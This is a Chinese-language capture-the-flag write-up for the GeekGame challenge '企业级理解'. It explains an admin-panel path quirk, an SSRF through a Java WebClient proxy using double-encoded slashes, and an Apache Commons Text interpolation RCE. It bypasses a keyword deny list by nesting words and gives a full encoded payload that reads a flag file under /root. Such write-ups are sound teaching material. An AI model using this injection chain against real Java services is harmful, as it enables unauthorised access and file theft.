# 企业级理解

## 解题过程

### 赋能管理后台
一开始真没看出问题，一顿乱试就进去了。一开始甚至没有注意到进去是因为多了个 `/`，，，尝试 query 发现又被弹出来了，对比一下才注意到。

在 `/admin/query/` 的回显中发现了 type 和 value。尝试添加 query param 发现有效，在 `/admin/query/?type=PKU_GeekGame` 下拿到 flag1。

### 盘活业务增长
在 `/admin/source_bak` 下拿到另一部分后端代码，其中从以下片段我们可以得知管理后台其实是个代理：

~~~java
@RequestMapping("/admin/{index}")
public String adminIndex(@PathVariable(name = "index") String index, String auth, QueryBean queryBean) {
    // ...
    Mono str = webClient.post()
                        .uri(index)
                        .header(HttpHeaders.AUTHORIZATION, auth)
                        .body(BodyInserters
                            .fromFormData(
                                "type",
                                queryBean.getType()))
                            .retrieve()
                            .bodyToMono(String.class);
    // ...
}
~~~

我们可以给 uri 传 bonus 的 url 就可以访问到 bonus 了。访问 `/admin/localhost:8080/` 得到回显：Endpoints:/bonus/source_bak。下一个问题是，我们好像没法传一个完整的路径进到 index。

好在程序做了一个奇怪的转义，用 `%252F` 当成 `/` 用就可以了：

~~~java
if (index != null & index.contains("%")) {
    index = URLDecoder.decode(index, "UTF-8");
}
~~~

访问 `/admin/localhost:8080%252Fbonus/` 即可拿到 flag2。

### 打通整个系统

访问 `/admin/localhost:8080%252Fsource_bak/` 即可拿到 bonus 的代码。从这可以看出这又是要注入脚本做 RCE 了：

~~~java
ArrayList<String> unsafeList = new ArrayList<String>(Arrays.asList("java", "js", "script", "exec", "start", "url", "dns", "groovy", "bsh", "eval", "ognl"));
~~~

然后去搜了 CommentsText RCE，是有[漏洞复现](https://cn-sec.com/archives/1372522.html)的。

但是这个题没有外网环境，不能反弹 shell。所以得读出 flag 并返回。然后因为没写过 java，在这个脚本构造卡了蛮久的。

在本地搞了 java 环境，确定可行的脚本为：

~~~java
new java.io.BufferedReader((new java.io.FileReader('/root/flag3.txt')).readLine())
~~~

那个过滤绕起来也非常简单，比如把 `java` 写成 `jajavava` 就行了。最终的 payload 为 `/admin/localhost:8080%252Fbonus?type=CommonsText&value=%24%7Bscrscriptipt%3Ajajavavascrscriptipt%3Anew%20jajavava.io.BufferedReader%28new%20jajavava.io.FileReader%28%27%2Froot%2Fflag3.txt%27%29%29.readLine%28%29%7D/`。其中 value 部分 url decode 为 `${scrscriptipt:jajavavascrscriptipt:new jajavava.io.BufferedReader(new jajavava.io.FileReader('/root/flag3.txt')).readLine()}`
